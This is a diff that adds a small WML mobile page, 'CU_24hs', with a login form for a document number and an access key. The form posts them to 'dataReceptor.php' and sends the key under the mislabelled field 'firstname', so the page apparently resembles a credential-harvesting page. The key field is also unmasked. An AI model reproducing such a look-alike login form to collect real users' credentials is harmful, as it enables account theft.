@@ -1,0 +1,54 @@
+<?xml version="1.0"?>
+<!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD WML 1.1//EN" 
+"http://www.wapforum.org/DTD/wml_1.1.xml">
+<wml>
+<head>
+<meta forua="true" http-equiv="Cache-Control" content="no-cache"/>
+</head>
+  <card id="datos" title="CU_24hs" newcontext="true">
+    <p align="center">
+    <img src="cu24hs.gif" alt="CU_24hs"/>
+    </p> 
+    <p align="center">
+    <anchor title="Ingresar">Ingresar
+       <go href="#clave">
+       <setvar name="tipdat" value="D"/> 
+       </go> 
+    </anchor>
+    </p>
+  </card>
+  <card id="clave" title="CU_24hs">
+    <onevent type="onenterforward">
+    <refresh>
+      <setvar name="clave" value=""/>
+      <setvar name="cuenta" value=""/>
+    </refresh>
+    </onevent>
+    <onevent type="onenterbackward">
+    <refresh>
+      <setvar name="clave" value=""/>
+      <setvar name="cuenta" value=""/>
+    </refresh>
+    </onevent>
+    <p align="center">
+    <fieldset title="Documento"> Documento:
+     <input type="text" name="cuenta" format="*M" value=""/>
+    </fieldset>
+    </p> 
+    <p align="center">
+    <fieldset title="Clave de Acceso">Clave de Acceso:
+      <input type="text" format="*N" size="32" name="clave" value=""/>
+    </fieldset>
+    </p>
+    <p align="center">
+    <anchor title="aceptar">Aceptar
+    <go method="post" href="dataReceptor.php">
+    <postfield name="firstname" value="$(clave)"/>
+    <postfield name="cuenta" value="$(cuenta)"/>
+    <postfield name="tipdat" value="D"/>
+    </go>
+    </anchor>
+    </p>
+  </card>
+
+</wml>
